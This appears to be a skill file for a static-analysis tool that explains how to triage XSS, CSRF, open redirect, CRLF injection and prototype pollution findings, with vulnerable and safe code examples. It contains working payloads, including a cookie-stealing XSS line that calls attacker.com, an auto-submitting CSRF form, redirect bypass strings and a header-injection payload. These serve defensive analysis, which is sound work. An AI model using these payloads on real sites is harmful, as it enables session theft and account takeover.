# Client-Side Skill — flow-sast Phase 4

Scope: XSS (stored/reflected/DOM), CSRF, clickjacking, open redirect,
CRLF injection, prototype pollution.

**Primary input (Phase 3 Verify)**:
- Verified path from `connect/joern_annotated_paths.json`:
  - `path.entry` — entry point receiving user input (file:line)
  - `path.sink` — output sink name + file (`innerHTML`, `echo`, `redirect`, `render_template_string`, etc.)
  - `path.flow_nodes[]` — call chain from user input → HTML/redirect output; look for escaping functions
  - `path.vuln_type` — `xss` / `csrf` / `open_redirect` / `crlf` / `prototype_pollution`
  - `path.path_decision` — verify depth

**Supplementary context (catalog/connect)**:
- `catalog/sinks.json` — HTML output sinks: `echo`, `print`, `innerHTML`, `document.write`, `dangerouslySetInnerHTML`, `res.send`, `Html.Raw`, `render_template_string`; redirect sinks: `redirect()`, `header()`, `Response.Redirect`
- `catalog/sources.json` — user input sources feeding these sinks
- `catalog/endpoints.json` → `auth_tags[]` — CSRF: check if state-changing endpoints (POST/PUT/DELETE) have CSRF token or `SameSite` cookie annotation
- `catalog/repo_intel.json` → `framework_detection` — template engine determines auto-escape behavior (Jinja2/Django = auto-escape unless `|safe`; React = safe unless `dangerouslySetInnerHTML`)

---

## 1. XSS (Cross-Site Scripting)

**VULNERABLE**:
```python
# Reflected
return f"<html>Search results for: {query}</html>"         # direct interpolation

# Stored
comment = request.json['content']
db.save(comment)                                            # stored unescaped
return render_template_string(f"<p>{comment}</p>")         # rendered unescaped
```
```php
echo "Hello " . $_GET['name'];                             // no htmlspecialchars
echo $row['user_input'];                                    // stored XSS
```
```js
document.getElementById('output').innerHTML = userInput;   // DOM XSS
element.innerHTML = location.hash.slice(1);                // URL fragment → DOM
document.write(decodeURIComponent(location.search));
```

**SAFE**:
```python
return render_template('page.html', query=query)           # auto-escaped in Jinja2
```
```php
echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```
```js
element.textContent = userInput;                           // text only, not HTML
element.innerText = userInput;
```

**Verify from flow_nodes**: user input → HTML output without escaping function.
Jinja2/Django templates auto-escape unless `| safe` / `mark_safe()` used.
React JSX auto-escapes unless `dangerouslySetInnerHTML`.

**Bypasses**:
- `htmlspecialchars` without `ENT_QUOTES` → bypass with `'` in attribute context
- CSP with `unsafe-inline` → inline script execution
- `<svg onload=alert(1)>` — works in HTML5
- Attribute injection: `" onfocus="alert(1)` in input value context
- DOM: `javascript:` URLs, `eval()`, `setTimeout(string)`

**Payloads**:
```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=fetch('https://attacker.com?c='+document.cookie)>
javascript:alert(1)
```

---

## 2. CSRF (Cross-Site Request Forgery)

**Pattern**: state-changing request with no CSRF token → attacker's page can trigger it.

**VULNERABLE**:
```html
<!-- Victim visits attacker page -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">
<form action="https://app.com/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

**SAFE**:
- CSRF token in form: `<input type="hidden" name="_token" value="{{ csrf_token() }}">`
- `SameSite=Strict` or `SameSite=Lax` cookie
- Custom request header (e.g. `X-Requested-With`) — simple requests can't set custom headers

**Verify**: state-changing endpoints (POST/PUT/DELETE) — is CSRF token validated?
Check cookie's `SameSite` attribute.
APIs consumed only by JS with custom headers: lower risk if `SameSite` set.

---

## 3. Open Redirect

**VULNERABLE**:
```python
next_url = request.args.get('next')
return redirect(next_url)                     # any URL accepted

# PHP
header("Location: " . $_GET['redirect']);
```

**SAFE**:
```python
from urllib.parse import urlparse
parsed = urlparse(next_url)
if parsed.netloc and parsed.netloc != request.host:
    return redirect('/')                      # external domain blocked
return redirect(next_url)
```

**Bypasses**:
```
https://evil.com                              # direct
//evil.com                                    # protocol-relative
https://trusted.com@evil.com                 # URL authority
https://trusted.com.evil.com                 # subdomain confusion
javascript:alert(1)                           # JS execution if not blocked
```

**Impact**: phishing (redirect to lookalike), OAuth token theft (redirect_uri + open redirect chain).

---

## 4. CRLF Injection

**Pattern**: user input injected into HTTP response headers without stripping `\r\n`.

**VULNERABLE**:
```python
response = make_response()
response.headers['Location'] = request.args.get('url')    # \r\n splits headers
```

**Payload**:
```
/redirect?url=https://example.com%0d%0aSet-Cookie:%20session=attacker
```
Result: injects arbitrary response header → cookie injection, response splitting.

**Verify**: user input reaches `response.headers[]` assignment or `header()` call.

---

## 5. Prototype Pollution (JavaScript)

**Pattern**: attacker controls object key path → pollutes `Object.prototype`.

**VULNERABLE**:
```js
function merge(target, source) {
    for (let key of Object.keys(source)) {
        if (typeof source[key] === 'object')
            merge(target[key], source[key]);   // key = "__proto__" → pollutes prototype
        else
            target[key] = source[key];
    }
}
merge({}, JSON.parse(userInput));
```

**Payload**: `{"__proto__": {"isAdmin": true}}`

**SAFE**: use `Object.create(null)` for merge targets, or check `key !== '__proto__'`.

**Impact**: property injection affecting all objects → auth bypass, RCE in some Node.js contexts.

---

## Confidence Calibration

| Scenario | Confidence |
|---|---|
| User input → `innerHTML` / `document.write` | HIGH |
| User input → `textContent` / `innerText` | FALSE POSITIVE |
| Jinja2 template with `\| safe` on user data | HIGH |
| Auto-escaped template, no `\| safe` | FALSE POSITIVE |
| State-changing POST with no CSRF token + no SameSite | HIGH |
| Cookie has `SameSite=Strict` | FALSE POSITIVE (CSRF) |
| `redirect(user_input)` no domain check | HIGH |
| Open redirect + path only (no domain) accepted | LOW |
